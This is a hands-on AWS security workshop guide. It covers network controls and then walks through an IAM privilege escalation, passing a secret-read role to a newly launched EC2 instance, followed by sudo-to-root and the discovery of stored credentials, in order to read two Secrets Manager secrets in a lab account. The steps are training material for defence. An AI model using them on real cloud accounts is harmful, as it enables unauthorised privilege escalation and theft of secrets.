# Basic cloud security
Today we will follow the tracks of a reckless engineer to read his darkest secrets. We will start on the workstation which you can find at https://lab.devopsplayground.org/

## Getting through the doors
Once you open your terminal, you can see the workdir directory with the `target-instance.txt` file where you can see a user and ip address of the server you need to log into. We will let you "guess" the password.
Assuming that you logged in succesfully we are going to stop and look at what we could do better on the account to prevent access to the server.
### Security group
We are going to start with Security groups which are attached to the instance. Allowing all traffic from any source is a dangerous practice and you should limit entries to the trusted sources and the ports actually used by the application/service.

<p align="center">
  <img src="./images/sg.png" />
</p>

Security groups are stateful therfore allowing incoming traffic allows the response.

See more in the documentation: https://docs.aws.amazon.com/vpc/latest/userguide/security-groups.html

### NACL
Network Access Control Lists allow you to manage traffic withing your VPC (applied to subnets), they are evaluated before Security groups and are stateless (You need to allow response traffic separately).

See more in the documentation: https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html

### Systems Manager
Lastly - it is worth to ask ourselves the question if allowing to access the instance via ssh is absolutely necessary. AWS allows you to use session manager for a console access to the server and use IAM to control the accesss to the instances.

See more in the documentation https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html

## IAM privilige escalation
### Discover availible credentials 
Once we logged in onto the ec2 instance we can discover if any IAM, API credenials are availible. Lets execute:
```bash
aws sts get-caller-identity
```
Your output should look like below:
<p align="center">
  <img src="./images/get-caller-identity.png" />
</p>
We can see that the instance assumed role dpg-funny-panda-workstation. Lets see what permissions are attached to this role. We can do this by executing:

```bash
aws iam list-attached-role-policies --role-name <your-role>
```
Your output should look like below: 

<p align="center">
  <img src="./images/list-policies.png" />
</p>

We can see one IAM policy attached to the role, lets investigate what permissions are defined in the policy.
Firs we need to look into the the policy:

```bash
aws iam get-policy --policy-arn <policy-arn>
```

Your output should look like below:

<p align="center">
  <img src="./images/get-policy.png" />
</p>

Note the default policy version and execute:

```bash
aws iam get-policy-version --policy-arn <policy-arn> --version-id <version>
```
You should see the full IAM policy and your output should start with below:

<p align="center">
  <img src="./images/instance-policy.png" />
</p>

The above policy allows us ec2 actions as as to pass secret-read-role. Lets investigate what policies this role has and what permissions are defined for this role. Lets execute three commands below
```
aws iam list-attached-role-policies --role-name secret-read-role
aws iam get-policy --policy-arn arn:aws:iam::204521158369:policy/get-playground-secret
aws iam get-policy-version --policy-arn arn:aws:iam::204521158369:policy/get-playground-secret --version-id v1
```
Your last output should look like
<p align="center">
  <img src="./images/secret-policy.png" />
</p>

Before getting any further, we can see that we will be constraint to `eu-west-1` region therfore we can setting it as default by executing

```bash
aws configure
```
You can skip first two entries by pressing enter and only add default region like below:

<p align="center">
  <img src="./images/configure.png" />
</p>


We can see that the policy allows us to read one of the secrets on the account. To do so we can create a new EC2 instance and attach secret-read-role to the instance profile and once we connect to the new server read the secret. 

First, lets create a new key-pair:

```bash
aws ec2 create-key-pair --key-name your-panda --query 'KeyMaterial' --output text > ~/<your-panda>
```

Now lets find out more about our current instance to deploy our new server in the same network. We can find our instance ID by executing:
```
aws sts get-caller-identity
```
Once we grab the id we can execute:
```bash
aws ec2 describe-instances --instance-ids <instance-id>
```
Your output should be a JSON file with the instance configuration like below.

<p align="center">
  <img src="./images/ec2.png" />
</p>

Note the the AMI ID, Security group id, and subnet ids, next lets create a new EC2 instance with the command below:
```bash
aws ec2 run-instances \
    --image-id <ami-id> \
    --count 1 \
    --instance-type t2.micro \
    --key-name <your-panda> \
    --security-group-ids <security-group-id> \
    --subnet-id <subnet-id> \
    --block-device-mappings "[{\"DeviceName\":\"/dev/sdf\",\"Ebs\":{\"VolumeSize\":30,\"DeleteOnTermination\":false}}]" \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=<your-panda>}]' 'ResourceType=volume,Tags=[{Key=Name,Value=<your-panda>-disk}]'
```
Once your new instance is created - note its IP address. Next lets create an instance profile.
```bash
aws iam create-instance-profile \
 --instance-profile-name <your-panda>
```
and attach the role to the profile
```bash
aws iam add-role-to-instance-profile \
--instance-profile-name <your-panda> \
--role-name secret-read-role
```
And finally associate the profile with our instance:
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<your-panda> --instance-id <instance-id>
```
Now our new server is ready to be used. Lets modify the permissions of our key before we use it to ssh to the server

```bash
chmod 400 ~/.ssh/<your-panda>
```
And ssh to the target server:

```bash
ssh ec2-user@<server-ip> -i ~/.ssh/<your-panda>
```
Once logged in we can try our last command:

```bash
aws secretsmanager get-secret-value --secret-id playground-secret
```

## OS privilage escalation + API keys
So we managed to read one of the secrets, but there is still one more around the corner. Lets get back to our target instance and see if our user is added to the sudoers list.
```bash
sudo su
```
Now once we are a root user lets try:

```bash
aws sts get-caller-identity
```
You should notice that this time we assumed a different AWS entity, AWS user, like below

<p align="center">
  <img src="./images/root.png" />
</p>

It looks like there are locally stored credentials for the root user which take precedence over attached role. We can confirm that by trying

```bash
env | grep AWS
```
Now lets see what permissions we have attached to this user.

```bash
aws iam list-attached-user-policies --user-name <username>
```
Looks like there are no policies attached:
<p align="center">
  <img src="./images/user-policies.png" />
</p>
Lets see if user has any inline policy then.

```bash
aws iam list-user-policies --user-name <username>
```
<p align="center">
  <img src="./images/user-inline.png" />
</p>
There is an inline policy attached to this user - let's investigate further

```bash
aws iam get-user-policy --user-name <username> --policy-name <policyname>
```
You should notice a familiar statement in the policy
<p align="center">
  <img src="./images/user-secret.png" />
</p>
Lastly lets reveal the last part be executing:

```bash
aws secretsmanager get-secret-value --secret-id User_secret
```